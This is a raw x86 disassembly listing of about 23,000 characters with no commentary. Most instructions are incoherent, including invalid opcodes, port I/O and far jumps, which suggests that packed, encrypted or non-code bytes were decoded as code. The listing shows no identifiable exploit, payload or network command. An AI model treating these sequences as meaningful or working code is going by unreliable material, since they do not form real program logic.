  411b15:	jnp    0x411ac0
  411b17:	sub    eax,0xe400df90
  411b1c:	xchg   DWORD PTR [ebx-0x78],edi
  411b1f:	ins    BYTE PTR es:[edi],dx
  411b20:	dec    ebp
  411b21:	aaa    
  411b22:	sub    eax,0x8c0ea8ef
  411b27:	rcr    BYTE PTR [eax-0x5d],cl
  411b2a:	neg    cl
  411b2c:	mov    ds:0xb63cd858,eax
  411b31:	call   0x4b5860a8
  411b36:	sub    eax,DWORD PTR ds:0x603b0b5e
  411b3c:	(bad)  
  411b3d:	xchg   ecx,eax
  411b3e:	les    esp,FWORD PTR [edi-0x48]
  411b41:	mov    WORD PTR [esi-0xe],cs
  411b44:	in     al,0xe4
  411b46:	push   esi
  411b47:	outs   dx,DWORD PTR ds:[esi]
  411b48:	xor    eax,DWORD PTR [ebx-0x2b]
  411b4b:	jae    0x411bbc
  411b4d:	rcr    BYTE PTR [ecx-0x7c3431ec],0xf8
  411b54:	jo     0x411ade
  411b56:	sahf   
  411b57:	push   ecx
  411b58:	bound  esi,QWORD PTR [ebx-0x1b]
  411b5b:	add    esp,esi
  411b5d:	pop    esp
  411b5e:	leave  
  411b5f:	xchg   ebx,eax
  411b60:	adc    DWORD PTR [edx+0x4b9dc117],eax
  411b66:	retf   
  411b67:	sub    bh,BYTE PTR [eax]
  411b69:	cmp    esp,esi
  411b6b:	sbb    al,0x5c
  411b6d:	mov    ch,0xa3
  411b6f:	mul    DWORD PTR [ebp+0x2cf0d14]
  411b75:	call   0xaf8c7b3d
  411b7a:	sub    ah,BYTE PTR [edi+0x9efe4b1]
  411b80:	in     al,0xb
  411b82:	push   ebx
  411b83:	pop    ss
  411b84:	in     eax,dx
  411b85:	jb     0x411be8
  411b87:	sar    DWORD PTR [ebp-0x774b402],cl
  411b8d:	aam    0x8e
  411b8f:	aas    
  411b90:	fbld   TBYTE PTR [edx+edi*4-0xe]
  411b94:	sub    DWORD PTR [eax],esi
  411b96:	add    ah,cl
  411b98:	fs mov ah,0x9e
  411b9b:	loopne 0x411b1e
  411b9d:	or     eax,0x94a73cb5
  411ba2:	je     0x411b88
  411ba4:	jo     0x411b77
  411ba6:	inc    DWORD PTR [edx+ebx*2]
  411ba9:	mov    eax,DWORD PTR [edx+edx*8+0x9056f10]
  411bb0:	sub    al,0xaf
  411bb2:	inc    ebp
  411bb3:	addr16 sub bl,bh
  411bb6:	cdq    
  411bb7:	arpl   WORD PTR [ecx+0x79a96afb],sp
  411bbd:	or     al,BYTE PTR [ecx]
  411bbf:	fnstsw WORD PTR [esi-0x5f]
  411bc2:	push   eax
  411bc3:	jae    0x411bff
  411bc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bc6:	xchg   edi,eax
  411bc7:	sbb    esp,ebp
  411bc9:	add    esi,ebp
  411bcb:	test   DWORD PTR [edi+ebp*1-0x6f6a1c20],eax
  411bd2:	das    
  411bd3:	or     eax,DWORD PTR [esi+0x4c659386]
  411bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bda:	push   0xffffffa9
  411bdc:	push   esi
  411bdd:	repnz les edx,FWORD PTR [eax]
  411be0:	iret   
  411be1:	test   al,0xd3
  411be3:	aam    0xf5
  411be5:	test   eax,0xb891cfb7
  411bea:	fchs   
  411bec:	jmp    0x411c1a
  411bee:	push   ebp
  411bef:	ja     0x411c04
  411bf1:	imul   BYTE PTR [ebp+0xae85245]
  411bf7:	addr16 cs push cs
  411bfa:	sbb    BYTE PTR [ebx+0x2edc04b6],0x64
  411c01:	mov    WORD PTR [edx],ss
  411c03:	icebp  
  411c04:	xlat   BYTE PTR ds:[ebx]
  411c05:	out    0x0,eax
  411c07:	push   cs
  411c08:	stos   DWORD PTR es:[edi],eax
  411c09:	adc    eax,0x93967b03
  411c0e:	adc    ebp,DWORD PTR [edx-0x19]
  411c11:	jle    0x411c1c
  411c13:	inc    eax
  411c14:	cld    
  411c15:	imul   esi,DWORD PTR [edx],0xc8f49435
  411c1b:	mov    WORD PTR [ebx+0x7e9b5105],ds
  411c21:	into   
  411c22:	jne    0x411bd6
  411c24:	mov    ecx,DWORD PTR [edi+0x3bb0da8c]
  411c2a:	retf   0xe524
  411c2d:	push   eax
  411c2e:	icebp  
  411c2f:	add    bh,0xa8
  411c32:	pushf  
  411c33:	pushf  
  411c34:	test   al,0xfa
  411c36:	retf   0xf57f
  411c39:	div    DWORD PTR [edx-0x3b67e36a]
  411c3f:	lods   al,BYTE PTR ds:[esi]
  411c40:	pop    ebp
  411c41:	mov    al,0xdb
  411c43:	cmp    DWORD PTR [ebx+0x14fda44a],edi
  411c49:	sbb    bl,al
  411c4b:	mov    ah,0xa0
  411c4d:	int3   
  411c4e:	inc    esi
  411c4f:	adc    esi,DWORD PTR [eax-0x7b]
  411c52:	std    
  411c53:	pop    ds
  411c54:	stos   DWORD PTR es:[edi],eax
  411c55:	pusha  
  411c56:	test   al,0xd3
  411c58:	bound  esp,QWORD PTR [eax-0x27]
  411c5b:	xor    DWORD PTR [ebp-0x74768257],esi
  411c61:	dec    ecx
  411c62:	or     DWORD PTR [eax],esi
  411c64:	pop    ebp
  411c65:	push   eax
  411c66:	rol    DWORD PTR [ebp+0x28],1
  411c69:	xor    edi,0x76
  411c6c:	dec    esp
  411c6d:	fwait
  411c6e:	xchg   edi,eax
  411c6f:	cld    
  411c70:	inc    edx
  411c71:	retf   0x1e47
  411c74:	push   esp
  411c75:	fld    TBYTE PTR [edi]
  411c77:	mov    ss,WORD PTR [eax-0x1d]
  411c7a:	push   edi
  411c7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c7c:	mov    ebx,0xf330c45c
  411c81:	jb     0x411c85
  411c83:	jo     0x411c35
  411c85:	mov    bl,0x3c
  411c87:	and    bh,BYTE PTR [eax]
  411c89:	repnz dec edi
  411c8b:	xchg   edi,eax
  411c8c:	sbb    DWORD PTR [ecx+0x6c45b34d],0xffffffd3
  411c93:	mov    ch,0xcf
  411c95:	pushf  
  411c96:	les    ebx,FWORD PTR [esi]
  411c98:	or     cl,0xd8
  411c9b:	iret   
  411c9c:	dec    edx
  411c9d:	fld    TBYTE PTR [ecx]
  411c9f:	cmp    al,0x8d
  411ca1:	push   esi
  411ca2:	add    esi,edi
  411ca4:	add    al,0xd7
  411ca6:	push   ebp
  411ca7:	stos   DWORD PTR es:[edi],eax
  411ca8:	xchg   ebx,eax
  411ca9:	jl     0x411d11
  411cab:	or     DWORD PTR [ecx],ebp
  411cad:	add    eax,0x7f41bce1
  411cb2:	imul   eax,DWORD PTR [ebx+0xe1ff15e],0xf7460050
  411cbc:	mov    ch,0x55
  411cbe:	sbb    BYTE PTR [edi-0xb],0x8e
  411cc2:	aam    0x8a
  411cc4:	add    al,BYTE PTR gs:[ecx+0x55]
  411cc8:	out    dx,eax
  411cc9:	jmp    0x5918:0xe6700db9
  411cd0:	mov    BYTE PTR [ebx+0x45fedf9a],bl
  411cd6:	sbb    BYTE PTR [eiz*1-0x1602b80f],dl
  411cdd:	add    DWORD PTR [ecx-0x50],ebx
  411ce0:	(bad)  
  411ce1:	sbb    al,0x2e
  411ce3:	hlt    
  411ce4:	lds    ebx,FWORD PTR [esp+ecx*8+0x657ee7e8]
  411ceb:	inc    ecx
  411cec:	mul    eax
  411cee:	adc    DWORD PTR [eax+0x3ee9fbf3],ecx
  411cf4:	mov    eax,ds:0xa0b990a1
  411cf9:	fs (bad) 
  411cfb:	aaa    
  411cfc:	fild   DWORD PTR [edi]
  411cfe:	call   0xac523890
  411d03:	mov    ds:0x9f915c96,al
  411d08:	call   0xb0243601
  411d0d:	ror    esp,0x9f
  411d10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d11:	jle    0x411cee
  411d13:	xchg   BYTE PTR [ecx],ah
  411d15:	sub    al,0x25
  411d17:	xlat   BYTE PTR ds:[ebx]
  411d18:	and    BYTE PTR [eax+0x6e],dh
  411d1b:	sbb    BYTE PTR [ebx+0x17],dl
  411d1e:	retf   
  411d1f:	popf   
  411d20:	retf   0x9b5c
  411d23:	dec    esp
  411d24:	mov    al,ds:0xef5d4824
  411d29:	arpl   WORD PTR ds:0xabbaafc,dx
  411d2f:	bound  edi,QWORD PTR [esi]
  411d31:	adc    eax,0xfe253aeb
  411d36:	fidivr DWORD PTR [edi]
  411d38:	addr16 sbb al,ch
  411d3b:	push   esp
  411d3c:	clc    
  411d3d:	lea    ebx,[edx-0x7f53f82a]
  411d43:	and    al,0x1b
  411d45:	or     esi,DWORD PTR [ecx+ecx*8-0xc]
  411d49:	and    eax,0xd022639f
  411d4e:	mov    ch,0x55
  411d50:	inc    edx
  411d51:	test   BYTE PTR [esi-0x87375e2],ah
  411d57:	daa    
  411d58:	jno    0x411d6b
  411d5a:	mov    cl,0x75
  411d5c:	inc    ecx
  411d5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d5e:	pushf  
  411d5f:	push   ebp
  411d60:	xor    al,0xfe
  411d62:	sti    
  411d63:	or     DWORD PTR [eax],eax
  411d65:	add    DWORD PTR [edi+0x5f],edx
  411d68:	les    eax,FWORD PTR [edi-0xba9c9b1]
  411d6e:	lea    esi,[ebx]
  411d70:	sbb    al,0x85
  411d72:	dec    edi
  411d73:	mov    ?,WORD PTR [edi-0x79]
  411d76:	shl    cl,1
  411d78:	xor    al,0xa5
  411d7a:	call   0xf53d2f7b
  411d7f:	imul   ecx,DWORD PTR [ebx],0x11
  411d82:	jns    0x411dc8
  411d84:	cmp    DWORD PTR [esi-0x35],ecx
  411d87:	inc    edx
  411d88:	mov    eax,0x5cfd4140
  411d8d:	retf   0xa105
  411d90:	je     0x411da4
  411d92:	popf   
  411d93:	sub    BYTE PTR [esi+0x24854bce],bl
  411d99:	cmp    al,0xc5
  411d9b:	pushf  
  411d9c:	stos   DWORD PTR es:[edi],eax
  411d9d:	pop    ds
  411d9e:	test   DWORD PTR [ebx+0x5e27eea5],ebp
  411da4:	int3   
  411da5:	bound  esp,QWORD PTR [esi+0x70a344cf]
  411dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dac:	inc    ebp
  411dad:	dec    ebp
  411dae:	xchg   ebx,eax
  411daf:	cli    
  411db0:	or     ch,cl
  411db2:	jle    0x411d78
  411db4:	cmp    BYTE PTR [ecx],ah
  411db6:	lods   al,BYTE PTR ds:[esi]
  411db7:	mov    dh,0xf3
  411db9:	dec    ebp
  411dba:	out    dx,eax
  411dbb:	add    edi,ecx
  411dbd:	idiv   esi
  411dbf:	in     eax,0xa1
  411dc1:	or     ebx,DWORD PTR [ebx-0x6fa804e8]
  411dc7:	cs in  eax,dx
  411dc9:	fmul   QWORD PTR [eax]
  411dcb:	sysexit 
  411dcd:	inc    ebp
  411dce:	jno    0x411e03
  411dd0:	rol    BYTE PTR [ebp-0x30],cl
  411dd3:	cdq    
  411dd4:	cmc    
  411dd5:	test   DWORD PTR [edx-0x35],ebp
  411dd8:	xchg   ebp,eax
  411dd9:	mov    ebx,0x4422b7ad
  411dde:	jmp    FWORD PTR [ebp-0x7ce6bcec]
  411de4:	sbb    bl,BYTE PTR [ebp-0x3e288526]
  411dea:	stc    
  411deb:	sbb    DWORD PTR [esi+0x5fc00658],ebp
  411df1:	add    esp,DWORD PTR [edx-0x11b36366]
  411df7:	and    BYTE PTR [edi-0x4e2c95a4],ah
  411dfd:	dec    edx
  411dfe:	int3   
  411dff:	mov    BYTE PTR [edx+ebp*1],ch
  411e02:	push   eax
  411e03:	inc    ebp
  411e04:	xchg   esi,eax
  411e05:	adc    eax,0x6eeca215
  411e0a:	(bad)  
  411e0b:	pop    edx
  411e0c:	pop    edx
  411e0d:	mov    al,ds:0xb996c081
  411e12:	dec    esi
  411e13:	data16 jge 0x411df1
  411e16:	jp     0x411e4c
  411e18:	xor    esp,DWORD PTR [edx+0x4b]
  411e1b:	lods   eax,DWORD PTR ds:[esi]
  411e1c:	push   edi
  411e1d:	xchg   BYTE PTR [edx+0x2bcb8715],ch
  411e23:	fld    DWORD PTR [edi+0x458b49cb]
  411e29:	in     al,0xf
  411e2b:	scas   eax,DWORD PTR es:[edi]
  411e2c:	rol    DWORD PTR [ebx],0xe0
  411e2f:	xchg   edx,eax
  411e30:	push   eax
  411e31:	xor    ebx,ebx
  411e33:	mov    edx,esp
  411e35:	dec    edx
  411e36:	inc    ebx
  411e37:	add    ebx,DWORD PTR [edx+ebx*1]
  411e3a:	jmp    0x41222e
  411e3f:	jp     0x411dc5
  411e41:	jb     0x411ea0
  411e43:	jb     0x411eb2
  411e45:	adc    DWORD PTR [ebx-0xc],esp
  411e48:	sub    ebp,DWORD PTR [esi]
  411e4a:	cmc    
  411e4b:	ins    DWORD PTR es:[edi],dx
  411e4c:	outs   dx,DWORD PTR ds:[esi]
  411e4d:	test   DWORD PTR [eax+edx*1],0x49707048
  411e54:	jge    0x411ec6
  411e56:	jo     0x411e30
  411e58:	adc    DWORD PTR ds:0x50ed8eb5,esi
  411e5e:	ja     0x411ebf
  411e60:	jo     0x411ecc
  411e62:	jo     0x411e12
  411e64:	dec    ebx
  411e65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e66:	and    al,0x50
  411e68:	fisubr DWORD PTR [ebp-0x8]
  411e6b:	sbb    DWORD PTR [edi-0x56],0x42
  411e6f:	gs fcomi st,st(0)
  411e72:	jnp    0x411e62
  411e74:	movq   mm2,QWORD PTR [ebp+eax*2-0x69]
  411e79:	jno    0x411e91
  411e7b:	xchg   edx,eax
  411e7c:	test   eax,0xf941cf68
  411e81:	xchg   edx,eax
  411e82:	push   ebp
  411e83:	mov    dh,0x36
  411e85:	ins    BYTE PTR es:[edi],dx
  411e86:	dec    ecx
  411e87:	push   0x23
  411e89:	mov    dl,bl
  411e8b:	adc    ah,BYTE PTR ss:[eax+0x437b998a]
  411e92:	sbb    esi,0xffffffce
  411e95:	xchg   edx,eax
  411e96:	aaa    
  411e97:	and    ebx,DWORD PTR [esi+ebp*8+0x6e]
  411e9b:	push   cs
  411e9c:	jne    0x411e5a
  411e9e:	lds    ebx,FWORD PTR [edi+0x1]
  411ea1:	test   ecx,ebx
  411ea3:	daa    
  411ea4:	jnp    0x411f17
  411ea6:	mov    edi,0x945b522b
  411eab:	int3   
  411eac:	and    al,0x3d
  411eae:	ficomp WORD PTR [edx+0x61]
  411eb1:	cdq    
  411eb2:	mov    esi,DWORD PTR [ebp+0x1e]
  411eb5:	pop    eax
  411eb6:	cmp    esi,edx
  411eb8:	(bad)  
  411eb9:	stos   DWORD PTR es:[edi],eax
  411eba:	add    eax,0xb95a298
  411ebf:	das    
  411ec0:	sar    BYTE PTR [ecx+0x2f],0x1a
  411ec4:	in     al,dx
  411ec5:	push   0xbdd6b1a7
  411eca:	mov    eax,0x888ed294
  411ecf:	mov    al,ds:0xb22ef62a
  411ed4:	pop    esi
  411ed5:	adc    ebp,DWORD PTR [esi+0x6d]
  411ed8:	sub    eax,0xbc38afa2
  411edd:	ins    BYTE PTR es:[edi],dx
  411ede:	daa    
  411edf:	pop    es
  411ee0:	out    0x11,eax
  411ee2:	jne    0x411ed5
  411ee4:	dec    esp
  411ee5:	jp     0x411e97
  411ee7:	mov    ecx,DWORD PTR [edx+edi*8+0x15]
  411eeb:	(bad)  
  411eed:	iret   
  411eee:	hlt    
  411eef:	jg     0x411e9e
  411ef1:	pop    esi
  411ef2:	cmc    
  411ef3:	inc    BYTE PTR [edx+0x4a]
  411ef6:	and    bh,BYTE PTR [esi+0x70b7fb7d]
  411efc:	jns    0x411f62
  411efe:	sub    DWORD PTR [esp+ebx*4-0x6ad9acc2],ebp
  411f05:	mov    ah,0x3e
  411f07:	jp     0x411f30
  411f09:	pop    eax
  411f0a:	and    al,0xa4
  411f0c:	push   ecx
  411f0d:	(bad)  
  411f0e:	ficom  WORD PTR [eax-0x30]
  411f11:	ret    
  411f12:	push   eax
  411f13:	jo     0x411f7c
  411f15:	add    esp,DWORD PTR [ebx-0x2e]
  411f18:	leave  
  411f19:	cmp    eax,0xab4ada8b
  411f1e:	push   edi
  411f1f:	push   edi
  411f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f21:	sub    cl,cl
  411f23:	sub    dl,BYTE PTR [eax-0x4303e026]
  411f29:	dec    esp
  411f2a:	stos   DWORD PTR es:[edi],eax
  411f2b:	xor    BYTE PTR [eax-0x11edcc1],ah
  411f31:	mov    BYTE PTR [ecx],0x13
  411f34:	sub    al,0xfa
  411f36:	sbb    esi,eax
  411f38:	jbe    0x411f46
  411f3a:	and    eax,0x207a8e53
  411f3f:	ss add eax,0x1c30119b
  411f45:	push   ss
  411f46:	pop    esp
  411f47:	mov    esp,0x3a618781
  411f4c:	mov    ch,0x6e
  411f4e:	jmp    0x411f45
  411f50:	push   esp
  411f51:	sbb    ah,bh
  411f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f54:	add    cl,bl
  411f56:	mov    esi,0x53a6ad52
  411f5b:	jns    0x411fa4
  411f5d:	xchg   edx,eax
  411f5e:	dec    eax
  411f5f:	jae    0x411f7b
  411f61:	in     eax,0x5a
  411f63:	cld    
  411f64:	call   0x771b:0xa16529c9
  411f6b:	add    DWORD PTR [edx-0x76],ebx
  411f6e:	stos   BYTE PTR es:[edi],al
  411f6f:	test   BYTE PTR [ebp-0x4d],bl
  411f72:	das    
  411f73:	inc    edx
  411f74:	into   
  411f75:	(bad)  
  411f76:	pop    ss
  411f77:	sar    ecx,cl
  411f79:	out    0x65,eax
  411f7b:	scas   al,BYTE PTR es:[edi]
  411f7c:	ret    0x20ea
  411f7f:	push   edx
  411f80:	and    ebx,DWORD PTR [esi-0x4]
  411f83:	or     al,0xef
  411f85:	call   0x6493:0xfa43c92a
  411f8c:	xchg   edi,eax
  411f8d:	xchg   ah,dl
  411f8f:	ds (bad) 
  411f91:	rcl    DWORD PTR [ebx+0x62],cl
  411f94:	mov    al,ds:0xb8ac9a27
  411f99:	jo     0x411fed
  411f9b:	inc    ebx
  411f9c:	lock jle 0x411f86
  411f9f:	inc    edi
  411fa0:	test   al,0x6c
  411fa2:	ret    0x21fd
  411fa5:	shr    DWORD PTR [edi],1
  411fa7:	jbe    0x411f7f
  411fa9:	shl    DWORD PTR [ebx],1
  411fab:	push   0xffffffb1
  411fad:	mov    ds:0x9e05ff8e,al
  411fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fb3:	(bad)  
  411fb4:	out    dx,al
  411fb5:	out    dx,al
  411fb6:	jns    0x411ff1
  411fb8:	or     al,0xa2
  411fba:	dec    ecx
  411fbb:	mov    cl,0x24
  411fbd:	jae    0x411fff
  411fbf:	lods   eax,DWORD PTR ds:[esi]
  411fc0:	or     DWORD PTR [edi],edx
  411fc2:	pop    esp
  411fc3:	(bad)  [edi-0xccd8201]
  411fc9:	sbb    dh,ah
  411fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fcc:	sbb    eax,0xbe1bc79b
  411fd1:	xchg   esi,eax
  411fd2:	and    ecx,DWORD PTR ds:0x6927a872
  411fd8:	enter  0xb754,0x64
  411fdc:	pop    edx
  411fdd:	les    ecx,FWORD PTR [edx+0x13da2814]
  411fe3:	pusha  
  411fe4:	pop    ebx
  411fe5:	xchg   edi,eax
  411fe6:	push   edx
  411fe7:	inc    edx
  411fe8:	and    al,0x6d
  411fea:	mov    DWORD PTR [ecx],esi
  411fec:	rol    BYTE PTR [eax+0xd],0xa1
  411ff0:	imul   ecx,DWORD PTR [eax+0x680fc49c],0xffffff9e
  411ff7:	and    cl,ah
  411ff9:	mov    bl,0xad
  411ffb:	(bad)  
  411ffc:	ret    0x6baa
  411fff:	add    BYTE PTR [esp+eax*4-0x4c],bh
  412003:	lea    edx,[ebp-0xf]
  412006:	(bad)  
  412008:	push   esi
  412009:	out    0xe4,al
  41200b:	fidivr WORD PTR [eax-0x129c6dd2]
  412011:	sbb    edx,DWORD PTR [ebp-0x55]
  412014:	imul   ecx,DWORD PTR [edi+0x56],0x49
  412018:	pushf  
  412019:	lock stc 
  41201b:	repz in eax,0x3b
  41201e:	shr    esi,0x72
  412021:	sub    BYTE PTR [eax+0x6d],dh
  412024:	mov    esp,0xce3aab7d
  412029:	popf   
  41202a:	mov    ah,0xb3
  41202c:	xor    BYTE PTR [ecx-0x7be40cd9],0x0
  412033:	shl    edi,0x24
  412036:	sti    
  412037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412038:	and    DWORD PTR [ecx-0x73],edi
  41203b:	iret   
  41203c:	xor    DWORD PTR [ebp-0x6ae5b913],ebx
  412042:	add    eax,0xb96bf9ee
  412047:	(bad)  [ecx+ecx*1]
  41204a:	jge    0x4120ac
  41204c:	xor    ebx,DWORD PTR [ecx-0x3a]
  41204f:	cmp    eax,0x73f63a80
  412054:	or     BYTE PTR [edi+0x76],ch
  412057:	dec    di
  412059:	xor    dh,BYTE PTR [edx]
  41205b:	(bad)  
  41205c:	sti    
  41205d:	adc    bh,BYTE PTR ds:[ecx-0x403a73ce]
  412064:	test   al,0xd7
  412066:	fwait
  412067:	pop    esp
  412068:	fwait
  412069:	sbb    DWORD PTR [ebp+0x1de54abe],esp
  41206f:	retf   0xbb91
  412072:	push   esp
  412073:	lea    ebp,[edx-0x1d51854f]
  412079:	cld    
  41207a:	scas   al,BYTE PTR es:[edi]
  41207b:	test   BYTE PTR [edi],dl
  41207d:	pop    ecx
  41207e:	cli    
  41207f:	xor    edx,edi
  412081:	in     eax,0xf4
  412083:	fcmovb st,st(7)
  412085:	push   edx
  412086:	inc    edx
  412087:	mov    al,ds:0x92b5e381
  41208c:	sub    cl,BYTE PTR [ecx]
  41208e:	fmul   DWORD PTR [ebx]
  412090:	mov    bl,BYTE PTR [esi]
  412092:	sub    edi,DWORD PTR [eax+eiz*1+0x5e]
  412096:	inc    edx
  412097:	add    al,0xa0
  412099:	and    al,0xec
  41209b:	mov    ebp,0x5fe7f729
  4120a0:	ret    0xfe6e
  4120a3:	repz jmp 0x855f:0xea116ad9
  4120ab:	fild   WORD PTR [edi]
  4120ad:	push   ecx
  4120ae:	mov    edi,0x97aefc3d
  4120b3:	out    0xb,al
  4120b5:	dec    ebx
  4120b6:	out    0x7e,eax
  4120b8:	stos   DWORD PTR es:[edi],eax
  4120b9:	mov    eax,0xd203eaa0
  4120be:	int    0x55
  4120c0:	pushf  
  4120c1:	sbb    al,0x80
  4120c3:	mov    BYTE PTR [eax],al
  4120c5:	or     esp,esp
  4120c7:	lds    ecx,FWORD PTR [eax]
  4120c9:	out    dx,eax
  4120ca:	mov    bh,0xc7
  4120cc:	sub    eax,0x3a67cd2
  4120d1:	mov    ebx,0x705b984f
  4120d6:	ds iret 
  4120d8:	addr16 jb 0x41213f
  4120db:	and    dh,BYTE PTR [ebx]
  4120dd:	pusha  
  4120de:	xchg   esi,eax
  4120df:	das    
  4120e0:	test   DWORD PTR [ecx],edx
  4120e2:	and    DWORD PTR [edx+esi*1-0x71d46fb3],0x6ea17ee8
  4120ed:	(bad)  
  4120ee:	(bad)  [esi]
  4120f0:	mov    ch,0xd1
  4120f2:	and    BYTE PTR [eax-0x4a1870c9],dh
  4120f8:	imul   ebp,DWORD PTR [eax+0xd6fdce0],0x7f
  4120ff:	push   ds
  412100:	and    al,BYTE PTR [esi]
  412102:	push   ebx
  412103:	in     al,0x51
  412105:	dec    eax
  412106:	or     BYTE PTR [edx-0x223195d7],dl
  41210c:	dec    edx
  41210d:	mov    ds:0x3d543ed0,al
  412112:	pushf  
  412113:	aam    0xe
  412115:	mov    ds:0x38e4bae7,al
  41211a:	cmp    eax,DWORD PTR [edx]
  41211c:	pop    esp
  41211d:	sbb    dh,0x14
  412120:	idiv   edi
  412122:	xor    eax,0xd309fc6e
  412127:	hlt    
  412128:	stc    
  412129:	or     eax,0xd6e95d16
  41212e:	popa   
  41212f:	sub    BYTE PTR [ebx],al
  412131:	fsub   DWORD PTR [ebx+0x27242768]
  412137:	shl    eax,cl
  412139:	int3   
  41213a:	ret    
  41213b:	sar    BYTE PTR [ecx+0x57],1
  41213e:	xor    BYTE PTR [eax],al
  412140:	ror    dh,0x5
  412143:	mov    dh,0xee
  412145:	ss jb  0x412192
  412148:	or     esp,DWORD PTR [edi]
  41214a:	mov    eax,0xe91fea35
  41214f:	fnsave [esi-0x18]
  412152:	adc    al,0x20
  412154:	mov    esp,0x664428f5
  412159:	adc    ebp,0x6b
  41215c:	or     eax,0x8a91ce9
  412161:	call   0xd333:0xc3095912
  412168:	pop    ecx
  412169:	dec    ebx
  41216a:	jns    0x4121d0
  41216c:	daa    
  41216d:	xchg   edi,eax
  41216e:	dec    esi
  41216f:	imul   edi,ebp,0xf57212e6
  412175:	repnz mov ecx,0xdcfbde1a
  41217b:	pop    edx
  41217c:	outs   dx,DWORD PTR ds:[esi]
  41217d:	inc    eax
  41217e:	add    al,0xfc
  412180:	(bad)  
  412182:	fs dec edi
  412184:	mov    dl,0x63
  412186:	(bad)  
  412188:	cli    
  412189:	xor    eax,0x20493f64
  41218e:	mov    bl,0x3e
  412190:	cld    
  412191:	push   edx
  412192:	cwde   
  412193:	sbb    ebx,DWORD PTR [ebx+0x1f]
  412196:	(bad)  
  412197:	inc    ebx
  412198:	jle    0x4121e1
  41219a:	fiadd  DWORD PTR [ecx+0x3136202]
  4121a0:	cs in  eax,0x9a
  4121a3:	call   0xa976b1c8
  4121a8:	sbb    eax,0xef0cc5ba
  4121ad:	jbe    0x4121e9
  4121af:	xchg   BYTE PTR [eax+0x4a0a13ec],cl
  4121b5:	jge    0x412154
  4121b7:	aam    0x45
  4121b9:	int3   
  4121ba:	xor    BYTE PTR [ecx+0x70],bl
  4121bd:	or     eax,0x24d78761
  4121c2:	xor    ah,0x80
  4121c5:	mov    esi,0xad1108a9
  4121ca:	and    esp,DWORD PTR [ecx]
  4121cc:	cdq    
  4121cd:	fcomip st,st(5)
  4121cf:	pop    ss
  4121d0:	xor    eax,0xc3898edd
  4121d5:	mov    eax,0x2806cc4e
  4121da:	push   ebx
  4121db:	or     dh,al
  4121dd:	add    eax,0x7a2d4b59
  4121e2:	add    eax,DWORD PTR [esi]
  4121e4:	jle    0x412259
  4121e6:	inc    ecx
  4121e7:	cmp    DWORD PTR [ebx+0x64f97b58],edx
  4121ed:	mov    al,0x36
  4121ef:	clc    
  4121f0:	jp     0x4121ab
  4121f2:	xchg   esi,eax
  4121f3:	cmc    
  4121f4:	adc    BYTE PTR [eax],0x7a
  4121f7:	pop    eax
  4121f8:	cmp    dh,BYTE PTR [ebp+0x36]
  4121fb:	inc    eax
  4121fc:	scas   al,BYTE PTR es:[edi]
  4121fd:	fist   DWORD PTR [edi-0x11]
  412200:	dec    edi
  412201:	mov    esp,0xe84f486b
  412206:	pop    ebp
  412207:	idiv   BYTE PTR [esi+0x5]
  41220a:	stc    
  41220b:	ss inc ebx
  41220d:	pop    ss
  41220e:	stc    
  41220f:	hlt    
  412210:	mov    cl,0xc
  412212:	jns    0x412250
  412214:	in     al,0x70
  412216:	loopne 0x4121a5
  412218:	xlat   BYTE PTR ds:[ebx]
  412219:	fistp  QWORD PTR [eax]
  41221b:	xchg   DWORD PTR [ebp+0x37],edi
  41221e:	jmp    0x4121d4
  412220:	call   0xcc0c:0xecfa3b83
  412227:	mov    edx,0x9fe7d925
  41222c:	sub    eax,0xd2334b91
  412231:	add    DWORD PTR [ebp-0xc],ebx
  412234:	pop    ebx
  412235:	mov    eax,DWORD PTR [ebp-0xc]
  412238:	pop    edi
  412239:	pop    esi
  41223a:	pop    ebx
  41223b:	leave  
  41223c:	ret    0x10
  41223f:	dec    ebp
  412240:	push   ebp
  412241:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  412247:	mov    esp,ebp
  412249:	or     ah,dh
  41224b:	dec    ebp
  41224c:	add    bh,al
  41224e:	add    BYTE PTR [eax],cl
  412250:	add    BYTE PTR [eax],al
  412252:	mov    DWORD PTR [eax],0x40f44545
  412258:	xor    DWORD PTR [eax],eax
  41225a:	test   DWORD PTR [ebx-0x34070b64],ecx
  412260:	(bad)  
  412261:	enter  0x4d45,0xbc
  412265:	mov    esi,DWORD PTR [eax]
  412267:	hlt    
  412268:	test   ebx,ecx
  41226a:	pushf  
  41226b:	enter  0x4df8,0x8b
  41226f:	mov    DWORD PTR [ebp-0x20],0x890208
  412276:	inc    ebp
  412277:	inc    ebp
  412278:	cld    
  412279:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41227f:	or     BYTE PTR [ebx+0x0],dl
  412282:	mov    ebx,0x8bd5500
  412287:	call   DWORD PTR [ecx-0x1]
  41228a:	pop    es
  41228b:	mov    ch,0x33
  41228d:	dec    ebx
  41228f:	(bad)  
  412290:	mov    eax,0x72009ca4
  412295:	push   DWORD PTR [edx]
  412297:	or     BYTE PTR [eax],al
  412299:	jmp    0xff89:0x75c84d03
  4122a0:	dec    ebp
  4122a1:	loopne 0x412273
  4122a3:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  4122a9:	add    BYTE PTR [ebx],dh
  4122ab:	mov    ecx,ebx
  4122ad:	hlt    
  4122ae:	add    ecx,ebx
  4122b0:	enter  0x899c,0x32
  4122b4:	dec    ebp
  4122b5:	add    ecx,eax
  4122b7:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  4122bd:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4122c4:	xor    ecx,ebx
  4122c6:	retf   
  4122c7:	enter  0x4d03,0xc8
  4122cb:	mov    DWORD PTR fs:[eax],ebx
  4122ce:	lea    eax,[eax]
  4122d0:	push   esp
  4122d1:	mov    edi,edi
  4122d3:	fs (bad) 
  4122d5:	(bad)  
